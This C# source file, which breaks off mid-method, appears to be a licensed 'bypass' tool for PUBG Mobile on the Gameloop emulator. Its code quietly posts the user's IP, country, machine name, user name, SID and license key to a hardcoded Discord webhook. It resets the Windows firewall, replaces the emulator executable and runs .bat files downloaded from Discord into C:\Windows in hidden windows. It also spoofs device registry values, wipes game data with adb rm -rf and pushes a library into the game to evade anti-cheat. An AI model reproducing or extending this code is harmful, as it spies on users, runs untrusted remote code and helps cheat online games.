
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic.Devices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Threading;
using System.Xml.Linq;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.TaskbarClock;
using Button = System.Windows.Forms.Button;
using Discord;
using DiscordMessenger;

using Embed = DiscordMessenger.Embed;
using Color = System.Drawing.Color;
using System.Net.Sockets;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Windows.Input;
using System.Web.UI.WebControls;
using System.Globalization;
using TheArtOfDevHtmlRenderer.Adapters;
using System.ComponentModel.Composition.Primitives;
using BorderStyle = System.Windows.Forms.BorderStyle;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.TrayNotify;
using System.Text.RegularExpressions;
using ImageFormat = System.Drawing.Imaging.ImageFormat;
using Image = System.Drawing.Image;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;
using KeyAuth;
using System.Timers;
using Newtonsoft.Json;
using System.Speech.Synthesis.TtsEngine;
using System.Collections.Specialized;
using System.Xml;
using Microsoft.VisualBasic;
using System.Xml.Serialization;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Media;
using static Guna.UI2.Native.WinApi;
using System.Security.Principal;
using System.Speech.Synthesis;
using System.Net.NetworkInformation;
using Discord.Net;
using System.Web;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.Window;
using System.Numerics;
using Guna.UI2;
using System.Runtime.Remoting.Messaging;
using System.Runtime.InteropServices.ComTypes;
using static TheArtOfDevHtmlRenderer.Adapters.RGraphicsPath;
using System.IO.Pipes;
using DiscordRPC;

using Guna.UI2.WinForms;
using DebugProtector;
using static System.Windows.Forms.AxHost;

namespace numer
{

    public partial class BP : Form
    {
        private static string ProtectionState;
        System.Timers.Timer RR;
        int h1, m2, s3;


        System.Timers.Timer t;
        int h, m, s;

        public string userName = Environment.UserName;
        public long enumerable = new long();
        private int x;
        private string sr;
        public string GagaPath = null;
        
        private static string string_0;
        private IContainer icontainer_0;
        public string GameVersion = "";
        public int bypassed = 0;
        private static string MokkaAdress;

        public static BP main;
        #region Structs
        public struct ProcessEntry32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExeFile;
        }
        #endregion
        #region Dlls
        [DllImport("user32.dll")]
        public static extern int SendMessage1(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture1();
        [DllImport("KERNEL32.DLL")]
        public static extern IntPtr CreateToolhelp32Snapshot(uint flags, uint processid);
        [DllImport("KERNEL32.DLL")]
        public static extern int Process32First(IntPtr handle, ref ProcessEntry32 pe);
        [DllImport("KERNEL32.DLL")]
        public static extern int Process32Next(IntPtr handle, ref ProcessEntry32 pe);
        #endregion
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd,
            int Msg, int wParam, int lParam);

        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();
        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);
        [DllImport("Gdi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);
        public int animatedTextLength = 0;
        public string animatedTextValue;
        public string animatedTextColor = "White";
        private System.Windows.Forms.Timer X = new System.Windows.Forms.Timer();
        public partial class NativeMethods
        {
            [DllImport("user32.dll", EntryPoint = "BlockInput")]
            [return: MarshalAs(UnmanagedType.Bool)]
            internal static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
        }
        public void lll()
        {
            try
            {
                WebClient web1 = new WebClient();
                string IP = web1.DownloadString("https://icanhazip.com/");
                //string ssCountry1 = web1.DownloadString("http://ip-api.com/csv/?fields=country");
                //string city = web1.DownloadString("http://ip-api.com/csv/?fields=city");
                string pc = System.Environment.MachineName;
                string pc1 = System.Environment.UserName;
                string ssd = WindowsIdentity.GetCurrent().User.Value;
                DateTime now = DateTime.Now;
                string key = Program.KeyAuthApp.user_data.username;
                string ss = @"@everyone" + "\n ☠ **Contry** : " + GetCountryByIP(IP) + "\n ☠ **IP** : " + IP.Trim() + "\n 💻 **Pc Name** : " + pc + "\n 📳 **HWID : **" + ssd + "\n ** 🖥 User_Name : **" + pc1 + "\n 🔑 **Key** : " + key + "\n 🛒 **Bypass** : " + "\n ⏱ Data : " + now;
                HttpClient client = new HttpClient();
                Dictionary<string, string> discordToPost = new Dictionary<string, string>();
                discordToPost.Add("content", ss);
                var content = new FormUrlEncodedContent(discordToPost);
                Uri webhook = new Uri("https://discord.com/api/webhooks/1162061912503234721/m-3MDH7896WyhXipI_NlILTIoPl0Vp51j37Iw8yFFkuP2teXcS-e7E1qNhMp29-DbS3m");
                client.PostAsync(webhook, content);
            }
            catch { }
        }


        private void addTextWithAnimation_Tick(object sender, EventArgs e)
        {
            //if (animatedTextLength < animatedTextValue.Length)
            //{
            //    malki.Text = malki.Text + animatedTextValue.ElementAt(animatedTextLength);
            //    animatedTextLength++;
            //}
            //else
            //{
            //    animatedTextLength = 0;
            //    addTextWithAnimation.Stop();
            //}
        }

        private void animatedText_Tick_1(object sender, EventArgs e)
        {
            if (malki.Text.Length > 0)
            {
                malki.Text = malki.Text.Remove(malki.Text.Length - 1);
            }
            else
            {
                malki.ForeColor = Color.FromName(animatedTextColor);
                addTextWithAnimation.Start();
                animatedText.Stop();
            }
        }

        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;


        public BP()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.None;
            Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 10, 10));
            
        }
        public void animated(string text, int thread = 0)
        {
            void taskRun()
            {
                this.BeginInvoke((MethodInvoker)delegate
                {
                    animatedTextValue = text;
                    animatedText.Start();
                });
            }
            if (thread == 0)
            {
                taskRun();
            }
            else
            {
                Task.Run(() =>
                {
                    Thread.Sleep(thread);
                    taskRun();
                });
            }
        }

     


        private void malki111(object sender, EventArgs e)
        {
            malki.Text = String.Empty;
        }
        public async void dos()
        {
            var sub = Program.KeyAuthApp.user_data.subscriptions[0].subscription;
            try
            {
                switch (toolStripComboBox4.Text)
                {
                    case "Arabic":
                        animated("نشكرك على أستخدام " + sub.ToUpper());
                        break;
                    case "English":
                        animated("Thanks For Use " + sub.ToUpper());
                        break;
                }

            }
            catch
            {

            }
          

            var request = WebRequest.Create("https://www.pubgmobile.com/cp/ZombieTreasure/bg.png");
           


            using (var response = request.GetResponse())
            using (var stream = response.GetResponseStream())
            {
                photo.Image = Bitmap.FromStream(stream);
            }
            var titleVal = Program.KeyAuthApp.user_data.subscriptions[0].subscription;
            var subtitleVal = Program.KeyAuthApp.var("#homeSubtitle");
            var status_descVal = Program.KeyAuthApp.var("#homeStatus_desc");

            
            titleLbl.Text = "   " + sub + "  [ BYPASS ]";
            WebClient web1 = new WebClient();
            string ssCountryss = web1.DownloadString("http://ip-api.com/csv/?fields=country");
            string ssCountryss1 = web1.DownloadString("http://ip-api.com/csv/?fields=countryCode");
            string IP = Program.KeyAuthApp.user_data.ip;
            toolStripMenuItem9.Text = "       " + IP;
            toolStripMenuItem24.Text = "       " + ssCountryss;
            // MessageBox.Show(GetFlag((ssCountryss).TrimEnd()));

            notifyIcon1.Text = sub;
        }

        private string text;
        private int len = 0;
        private int khaled = 0;


        private void Form1_Load(object sender, EventArgs e)
        {
            dos();
            timer1.Start();
            t = new System.Timers.Timer();
            t.Interval = 1000;
            t.Elapsed += OnTimeevent;
            tttmer.Visible = false;
        }
        private void OnTimeevent(object sender, ElapsedEventArgs e)
        {
            Invoke(new Action(() =>
            {
                s += 1;
                if (s == 60)
                {
                    s = 0;
                    m += 1;
                }
                if (m == 60)
                {
                    m = 0;
                    h += 1;
                }
                tttmer.Text = string.Format("{0}:{1}:{2}", h.ToString().PadLeft(2, '0'), m.ToString().PadLeft(2, '0'), s.ToString().PadLeft(2, '0'));

            }));
        }

        public void dos(string command)
        {
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = " /C " + command,
                WindowStyle = ProcessWindowStyle.Hidden,
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardError = false,
                RedirectStandardOutput = false
            };
            process.Start();
            process.WaitForExit(5000);
        }
        public static string ExecuteCommand(string command)
        {

            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/c " + command)
            {
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process proc = new Process())
            {
                proc.StartInfo = procStartInfo;
                proc.Start();

                string output = proc.StandardOutput.ReadToEnd();

                if (string.IsNullOrEmpty(output))
                    output = proc.StandardError.ReadToEnd();

                return output;
            }

        }
        public uint maxTh = 0u; public string foundPID = "";
        private int number;
        [DllImport("user32.dll")]
        public static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        public static bool checkMachineType()
        {
            RegistryKey winLogonKey = Registry.LocalMachine.OpenSubKey(@"Software\Tencent\MobileGamePC\NewOpGuidTip", true);
            string currentKey = winLogonKey.GetValue("com.tencdddent.ig-dpiguid").ToString();
            if (currentKey == "0")
                return (false);
            return (true);
        }
        private void OnTimeevent1(object sender, ElapsedEventArgs e)
        {
            
        }


        static void lineChanger(string newText, string fileName, int line_to_edit)
        {
            string[] arrLine = File.ReadAllLines(fileName);
            arrLine[line_to_edit - 1] = newText;
            File.WriteAllLines(fileName, arrLine);
        }

         public int malak = 0;

        private async void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {





            try
            {


                dos("netsh advfirewall reset");
                dos("taskkill /F /IM AndroidProcess.exe");
                dos("taskkill /F /IM ProjectTitan.exe");
                dos("taskkill /F /im AndroidEmulator.exe");
                dos("taskkill /F /im AndroidEmulatorEn.exe");
                dos("taskkill /F /im AndroidEmulatorEx.exe");
                dos("taskkill /F /im Gameloop.exe");
                number = 0;
                foreach (Process process in Process.GetProcessesByName("hm.ttf"))
                {
                    process.Kill();
                }

                string UI = @"HKEY_LOCAL_MACHINE\Software\WOW6432Node\Tencent\MobileGamePC\UI";
                string glé = "InstallPath";
                object pubgglé = Registry.GetValue(UI, glé, null);


                File.Delete(@"C:\1.data");
                File.Delete(@"C:\2.data");
                File.Delete(@"C:\Temphax.exe");
                File.Delete(@"C:\hax.exe");
                FileInfo fileInfo = new FileInfo(pubgglé + @"\AndroidEmulatorEx.exe");
                long size = fileInfo.Length;
                if (size.ToString() != "6118344")
                {
                    switch (toolStripComboBox4.Text)
                    {
                        case "Arabic":
                            animated("تنزيل موارد المحاكي ألانتظار لطفـــا");
                            break;
                        case "English":
                            animated("Download Emulator Resources  Please Wait");
                            break;
                    }
                    Thread.Sleep(8222);
                    using (WebClient gg = new WebClient())
                    {
                        await Task.Run(() => gg.DownloadFile("https://cdn.discordapp.com/attachments/1076905977779073184/1088534155173834892/AndroidEmulatorEx.exe", pubgglé + @"\AndroidEmulatorEx.exe"));
                    }
                }

                else
                {
                    using (WebClient gg = new WebClient())
                    {
                        await Task.Run(() => gg.DownloadFile("https://cdn.discordapp.com/attachments/1076905977779073184/1088534155173834892/AndroidEmulatorEx.exe", pubgglé + @"\AndroidEmulatorEx.exe"));
                    }

                }
                switch (toolStripComboBox4.Text)
                {
                    case "Arabic":
                        animated("جاري تشغيل المحاكي");
                        break;
                    case "English":
                        animated("STARTING GAMELOOP");
                        break;
                }

                Random random1 = new Random();
                Random random = new Random();
                string RandomString(int length)
                {
                    const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                    return new string(Enumerable.Repeat(chars, length)
                        .Select(s => s[random.Next(s.Length)]).ToArray());
                }
                var sub = Program.KeyAuthApp.user_data.subscriptions[0].subscription;
                //lineChanger("Title = " + $@"[{sub} " + " BYPASS ]", "C:\\Program Files\\TxGameAssistant\\ui\\Config.ini", 8);
                var randomName = RandomString(7);
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Tencent\MobileGamePC", true);
                RegistryKey key1 = Registry.CurrentUser.OpenSubKey(@"Software\Tencent\MobileGamePC", true);
                RegistryKey key12 = Registry.CurrentUser.OpenSubKey(@"Software\Tencent\MobileGamePC", true);
                //RegistryKey check1 = Registry.CurrentUser.OpenSubKey(@"Software\Tencent\MobileGamePC\TempPath", true);
                key12.SetValue("AdbDisable", 000000000);
                key.SetValue("VMDeviceManufacturer", RandomString(7)); //sets 'someData' in 'someValue' 
                key.SetValue("VMDeviceModel", RandomString(7)); //sets 'someData' in 'someValue' 
                key.SetValue("VMPhoneDevice", RandomString(7));
                key.Close();
                key1.Close();
                key12.Close();
                 Thread.Sleep(8111);
                WebClient webClient122 = new WebClient();
                bool gust = toolStripMenuItem7.Checked;
                if (gust)
                {
                    webClient122.DownloadFile("https://cdn.discordapp.com/attachments/1000894845981831209/1078264381672009758/ResetGuest_1.bat", "C:\\Windows\\ResetGuest.bat");
                    ExecuteCommand("C:\\Windows\\ResetGuest.bat");
                }
                Process[] p = Process.GetProcessesByName("AndroidEmulatorEx");
                if (p.Length > 0)
                {
                    switch (toolStripComboBox4.Text)
                    {
                        case "Arabic":
                            animated("جاري تنظيف المحاكي");

                            break;
                        case "English":
                            animated("CLEAN GAMELOOP");

                            break;
                    }

                }
                else
                {
                    switch (toolStripComboBox4.Text)
                    {
                        case "Arabic":
                            animated("AndroidEmulatorEx غير موجود");
                            break;
                        case "English":
                            animated("AndroidEmulatorEx Not Found");
                            break;
                    }

                    return;
                }
                Thread.Sleep(8321);

                try
                {
                    RegistryKey check12 = Registry.CurrentUser.OpenSubKey(@"Software\Tencent\MobileGamePC\", true);
                    string currentKey = check12.GetValue("sf").ToString();
                    string path = currentKey + "\\test";
                    using (FileStream fs = File.Create(path)) ;
                    FileInfo f = new FileInfo(currentKey + "\\test");
                    f.Attributes = FileAttributes.Hidden;
                }
                catch { }
                
                switch (toolStripComboBox4.Text)
                {
                    case "Arabic":
                        animated("جاري فتح اللعبة ");

                        break;
                    case "English":
                        animated("STARTING PUBGM");

                        break;
                }
                try
                {
                    webClient122.DownloadFile("https://cdn.discordapp.com/attachments/1116506521086480445/1130319755044204646/1.mp3", "C:\\Windows\\1.bat");

                    malak = 1;
                    webClient122.DownloadFile("https://cdn.discordapp.com/attachments/1076905977779073184/1101497492383744080/hhh.bat", "C:\\Windows\\1.bat");
                    ExecuteCommand("C:\\Windows\\1.bat");
                    Thread.Sleep(4333);



                  






                    Process[] p1 = Process.GetProcessesByName("AndroidEmulatorEx");
                    if (p1.Length > 0)
                    {
                        string keyPath = @"HKEY_CURRENT_USER\Software\Tencent\MobileGamePC\NewOpGuidTip";
                        string gl = "com.tencent.ig-dpiguid";
                        string vn = "com.tencent.vng-dpiguid";
                        string kr = "com.pubg.krmobile-dpiguid";
                        object pubggl = Registry.GetValue(keyPath, gl, null);
                        object pubgvn = Registry.GetValue(keyPath, vn, null);
                        object pubgkr = Registry.GetValue(keyPath, kr, null);
                        if (toolStripComboBox2.Text == "")
                        {
                            switch (toolStripComboBox4.Text)
                            {
                                case "Arabic":
                                    animated("يرجى تحديد اصدار اللعبة لطفــــا ");
                                    break;
                                case "English":
                                    animated("Please Slected Game Vesrion");
                                    break;
                            }
                        }
                        switch (toolStripComboBox2.SelectedItem.ToString())
                        {
                            case "GLOBAL |عالمية":
                                    if (pubggl != null)
                                    {
                                        dos("adb Devices");
                                        dos("adb shell rm -rf /sdcard/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/*.json");
                                        dos("adb shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/login-identifier.txt");
                                        dos("adb shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/ROLEINFO");
                                        dos("adb shell rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/LOGS");
                                        dos("adb shell rm -rf /data/data/com.tencent.ig/app_appcache");
                                        dos("adb shell rm -rf /data/data/com.tencent.ig/app_crashrecord");
                                        dos("adb shell rm -rf /data/data/com.tencent.ig/app_crashSight");
                                        dos("adb shell rm -rf /data/data/com.tencent.ig/app_databases");
                                        dos("adb shell rm -rf /data/data/com.tencent.ig/app_flutter");
                                        dos("adb shell rm -rf /data/data/com.tencent.ig/app_geolocation");
                                        dos("adb shell rm -rf /data/data/com.tencent.ig/app_textures");
                                        dos("adb shell rm -rf /data/data/com.tencent.ig/app_webview");
                                        dos("adb shell rm -rf /data/data/com.tencent.ig/shared_prefs");
                                        dos("adb shell rm -rf /data/data/com.tencent.ig/cache");
                                        dos("adb shell monkey -p com.tencent.ig -c android.intent.category.LAUNCHER 1");
                                        //File.Delete(cf4b7fa8f8c1aa3a.lib1);
                                        //File.Delete(cf4b7fa8f8c1aa3a.lib12);
                                    }
                                    else if (pubggl == null)
                                    {
                                        switch (toolStripComboBox4.Text)
                                        {
                                            case "Arabic":
                                                animated("com.tencent.ig غير موجود ");
                                                break;
                                            case "English":
                                                animated("com.tencent.ig Not Found");
                                                break;
                                        }
                                        return;

                                    }

                                break;
                            case "VETNAM |فيتنامية":
                                if (pubgvn != null)
                                {
                                    dos("adb kill-server");
                                    dos("adb Start-server");
                                    dos("adb shell rm -rf /sdcard/Android/data/com.tencent.vng/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/*.json");
                                    dos("adb shell cp /sdcard/android/data/com.tencent.vng/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SrcVersion.ini /data/share1/");
                                    dos("adb shell monkey -p com.tencent.vng -c android.intent.category.LAUNCHER 1");
                                }
                                else if (pubgvn == null)
                                {
                                    switch (toolStripComboBox4.Text)
                                    {
                                        case "Arabic":
                                            animated("com.tencent.vng غير موجود ");
                                            break;
                                        case "English":
                                            animated("com.tencent.vng Not Found");
                                            break;
                                    }
                                    return;
                                }
                                break;
                            case "KOREA | كورية":
                                if (pubgkr != null)
                                {
                                    dos("adb kill-server");
                                    dos("adb Start-server");
                                    dos("adb shell rm -rf /sdcard/Android/data/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/playerprefs.sav");
                                    dos("adb shell cp /sdcard/android/data/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SrcVersion.ini /data/share1/");
                                    dos("adb shell rm -rf /storage/emulated/0/Android/data/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/ROLEINFO");
                                    dos("adb shell rm -rf /storage/emulated/0/Android/data/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/LOGS");
                                    dos("adb shell rm -rf /data/data/com.pubg.krmobile/app_appcache");
                                    dos("adb shell rm -rf /data/data/com.pubg.krmobile/app_crashrecord");
                                    dos("adb shell rm -rf /data/data/com.pubg.krmobile/app_crashSight");
                                    dos("adb shell rm -rf /data/data/com.pubg.krmobile/app_databases");
                                    dos("adb shell rm -rf /data/data/com.pubg.krmobile/app_flutter");
                                    dos("adb shell rm -rf /data/data/com.pubg.krmobile/app_geolocation");
                                    dos("adb shell rm -rf /data/data/com.pubg.krmobile/app_textures");
                                    dos("adb shell rm -rf /data/data/com.pubg.krmobile/app_webview");
                                    dos("adb shell rm -rf /data/data/com.pubg.krmobile/shared_prefs");
                                    dos("adb push C:\\Windows\\1.data data/data/com.pubg.krmobile/lib/libigshare.so");
                                    dos("adb shell rm -rf /data/data/com.pubg.krmobile/shared_prefs");
                                    dos("adb shell am start -n com.pubg.krmobile/com.epicgames.ue4.SplashActivity");
                                    dos("adb shell rm -rf /data/data/com.pubg.krmobile/lib/libigshare.so");
                                }
                                else if (pubgkr == null)
                                {
                                    switch (toolStripComboBox4.Text)
                                    {
                                        case "Arabic":
                                            animated("com.pubg.krmobile غير موجود ");
                                            break;
                                        case "English":
                                            animated("com.pubg.krmobile Not Found");
                                            break;
                                    }
                                    return;

                                }
                                break;
                            default:
                                switch (toolStripComboBox4.Text)
                                {
                                    case "Arabic":
                                        animated("يرجى تحديد اصدار اللعبة لطفــــا ");
                                        break;
                                    case "English":
                                        animated("Please Slected Game Vesrion");
                                        break;
                                }
                                break;
                        }

                    }
                    else
                    {
                        switch (toolStripComboBox4.Text)
                        {
                            case "Arabic":
                                animated("AndroidEmulatorEx غير موجود");
                                break;
                            case "English":
                                animated("AndroidEmulatorEx Not Found");
                                break;
                        }

                        return;
                    }
                }
                catch { }
                Thread.Sleep(4400);
                bool ipad = toolStripMenuItem16.Checked;
                bool fps = toolStripMenuItem12.Checked;
                bool hd = toolStripMenuItem13.Checked;
                bool night = toolStripMenuItem14.Checked;
                bool SSS = toolStripMenuItem21.Checked;
                bool ping = toolStripMenuItem22.Checked;
                bool xx = toolStripMenuItem23.Checked;
                RR = new System.Timers.Timer();
                RR.Interval = 1000;
                RR.Elapsed += OnTimeevent1;
                RR.Start();
                if (p.Length > 0)
                {
                    try
                    {


                    }
                    catch
                    {
                        switch (toolStripComboBox4.Text)
                        {
                            case "Arabic":
                                animated("[💘] فشل التجاوز [💘] ");
                                break;
                            case "English":
                                animated("[💘] Bypass Failed [💘]");
                                break;
                        }
                        dos("taskkill /F /IM AndroidProcess.exe");
                        dos("taskkill /F /IM ProjectTitan.exe");
                        dos("taskkill /F /im AndroidEmulator.exe");
                        dos("taskkill /F /im AndroidEmulatorEn.exe");
                        dos("taskkill /F /im AndroidEmulatorEx.exe");
                        dos("taskkill /F /im Gameloop.exe");
                    }
                }
                else
                {
                    switch (toolStripComboBox4.Text)
                    {
                        case "Arabic":
                            animated("AndroidEmulatorEx غير موجود");
                            break;
                        case "English":
                            animated("AndroidEmulatorEx Not Found");
                            break;
                    }

                    return;
                }
                int chack = 0;
                switch (toolStripComboBox2.SelectedItem.ToString())
                {

                }
                if (chack == 1)
                {
                    var sub1 = Program.KeyAuthApp.user_data.subscriptions[0].subscription;
                    switch (toolStripComboBox4.Text)
                    {
                        case "Arabic":
                            animated("[❤️] تم التجاوز بنجاح أستمتع [❤️]");
                            notifyIcon1.BalloonTipText = "[❤️] تم التجاوز بنجاح أستمتع [❤️]";
                            notifyIcon1.BalloonTipTitle = sub1;
                            notifyIcon1.Icon = SystemIcons.Application;
                            notifyIcon1.ShowBalloonTip(500);
                            break;
                        case "English":
                            animated("[❤️] Bypass Enjected Done Enjoy [❤️]");
                            notifyIcon1.BalloonTipText = "[❤️] Bypass Enjected Done Enjoy [❤️]";
                            notifyIcon1.BalloonTipTitle = sub1;
                            notifyIcon1.Icon = SystemIcons.Application;
                            notifyIcon1.ShowBalloonTip(500);
                            break;
                    }
                    tttmer.Visible = true;
                    t.Start();

                    dos("adb shell rm -rf data/data/com.tencent.ig/lib/libtest.so");
                    //cf4b7fa8f8c1aa3a.batri();
                    malak = 0;
                    //cf4b7fa8f8c1aa3a.HWID();
                    guna2GradientCircleButton1.Visible = false;
                    guna2ImageButton3.Visible = false;
                    guna2ImageButton2.Visible = false;
                    guna2ImageButton6.Visible = false;
                    guna2ImageButton1.Visible = false;
                    startCirclePnl.Visible = false;
                    //guna2CircleProgressBar1.Visible = false;
                    Thread.Sleep(7555);
                    Thread.Sleep(2000);
                    bool cheat = toolStripMenuItem8.Checked;
                    if (cheat)
                    {
                        try
                        {
                            WebClient webClient = new WebClient();

                            Thread.Sleep(6000);
                            Thread.Sleep(6000);
                            Thread.Sleep(2000);

                           // Process.Start("C:\\Windows\\Temp\\hax.exe");
                            khaledmalki.Show("Hax Internal in Loded ... ");
                        }
                        catch (Exception ex) { MessageBox.Show(ex.Message); }

                    }




                }
                else
                {
                    switch (toolStripComboBox4.Text)
                    {
                        case "Arabic":
                            animated("[💘] فشل التجاوز [💘] ");
                            break;
                        case "English":
                            animated("[💘] Bypass Failed [💘]");
                            break;
                    }
                }
            }
            catch { }
        }

        private void label7_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
        public static bool SubExist(string name)
        {
            if (Program.KeyAuthApp.user_data.subscriptions.Exists(x => x.subscription == name))
                return true;
            return false;
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            Random rn = new Random();
            Color randomColor = Color.FromArgb(rn.Next(256), rn.Next(256), rn.Next(256));
            titleLbl.ForeColor = randomColor;
            malki.ForeColor = randomColor;
            //khaled1.BorderColor = randomColor;
            malki.BorderColor = randomColor;
            toolStripTextBox4.ForeColor = randomColor;
            // malki.BorderColor = randomColor;
            Random rsn = new Random();
            Color randomColor1 = Color.FromArgb(rn.Next(255), rn.Next(255), rn.Next(0));
            tttmer.ForeColor = randomColor1;
            //guna2CircleProgressBar1.ProgressColor = Color.FromArgb(rn.Next(255), rn.Next(255), rn.Next(0));
            //guna2CircleProgressBar1.ProgressColor2 = randomColor;
            try
            {
                CultureInfo culture;

                var sub = Program.KeyAuthApp.user_data.subscriptions[0].subscription;
                var arabi = Thread.CurrentThread.CurrentUICulture = new System.Globalization.CultureInfo("ar");
                switch (toolStripComboBox4.Text)
                {
                    case "Arabic":
                        toolStripMenuItem16.Text = "منظور ايباد";
                        toolStripMenuItem12.Text = "٩٠ فريم";
                        toolStripMenuItem13.Text = "أيتشدي";
                        toolStripMenuItem14.Text = "مــود ليلــي";
                        toolStripMenuItem21.Text = "مؤشٍــر صغيــر";
                        toolStripMenuItem22.Text = "اصلاح البيــنق";
                        toolStripMenuItem23.Text = "تأثــير أكــس";
                        toolStripMenuItem10.Text = "         خروج أمن";
                        toolStripMenuItem11.Text = "         تصغيــــر البرنامج";
                        toolStripMenuItem6.Text = "أنتي ستريـــم";
                        toolStripMenuItem7.Text = "ترسيت القيست";
                        toolStripMenuItem8.Text = "هاك داخلي";
                        toolStripTextBox3.Text = "أختيار اللغة ";
                        toolStripTextBox2.Text = "أختيار اصدار اللعبة";
                        toolStripTextBox1.Text = "نوع البرنامج";
                        toolStripTextBox4.Text = "اللون الاخضر = عادي : اللون الاحمر = خطر";
                        break;
                    case "English":
                        toolStripMenuItem16.Text = "Ipad View";
                        toolStripMenuItem12.Text = "90 FPS";
                        toolStripMenuItem13.Text = "UHD";
                        toolStripMenuItem14.Text = "Night Mode";
                        toolStripMenuItem21.Text = "Small Crosshair";
                        toolStripMenuItem22.Text = "Fix Ping";
                        toolStripMenuItem23.Text = "X EFFECT";
                        toolStripMenuItem10.Text = "      Safe Exit";
                        toolStripMenuItem11.Text = "      Mini Mize";
                        toolStripTextBox3.Text = "Select Language";
                        toolStripMenuItem6.Text = "Anti Stream";
                        toolStripMenuItem7.Text = "Reset Guest";
                        toolStripMenuItem8.Text = "Hack Internal";
                        toolStripTextBox2.Text = "Select Version Of The Game";
                        toolStripTextBox1.Text = "Program Type";
                        toolStripTextBox4.Text = "Color Green = Normal : Color red = Risk";
                        break;

                }

            }
            catch { }





        }


        private void photo_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                //SendMessage(Handle, cf4b7fa8f8c1aa3a.WM_NCLBUTTONDOWN, cf4b7fa8f8c1aa3a.HT_CAPTION, 0);
            }
        }



        private void k2_Click(object sender, EventArgs e)
        {
            BeginInvoke(new Action(() =>
            {
                foreach (var button in this.Controls.OfType<Button>())
                {
                    button.Cursor = Cursors.Hand;
                }

                // animatedText.Start();
            }));
            try
            {


            }

            catch { }
        }



        private async void backgroundWorker4_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                dos("netsh advfirewall reset");
                switch (toolStripComboBox4.Text)
                {
                    case "Arabic":
                        await Task.Run(() => animated("خروج التــــجاوز"));
                        break;
                    case "English":
                        await Task.Run(() => animated("Closing Bypass"));
                        break;
                }
                t.Stop();
                await Task.Run(() => dos("taskkill /F /IM AndroidProcess.exe"));
                await Task.Run(() => dos("taskkill /F /IM ProjectTitan.exe"));
                await Task.Run(() => dos("taskkill /F /im AndroidEmulator.exe"));
                await Task.Run(() => dos("taskkill /F /im AndroidEmulatorEn.exe"));
                await Task.Run(() => dos("taskkill /F /im AndroidEmulatorEx.exe"));
                await Task.Run(() => dos("taskkill /F /im Gameloop.exe"));
                Thread.Sleep(5333);
                Application.Exit();
            }
            catch { }
        }

        private void guna2ImageButton1_Click(object sender, EventArgs e)
        {
            guna2ContextMenuStrip1.Show(Cursor.Position.X, Cursor.Position.Y);

        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            BeginInvoke(new Action(() =>
            {
                foreach (var button in this.Controls.OfType<Button>())
                {
                    button.Cursor = Cursors.Hand;
                }

                // animatedText.Start();
            }));
            try
            {



            }

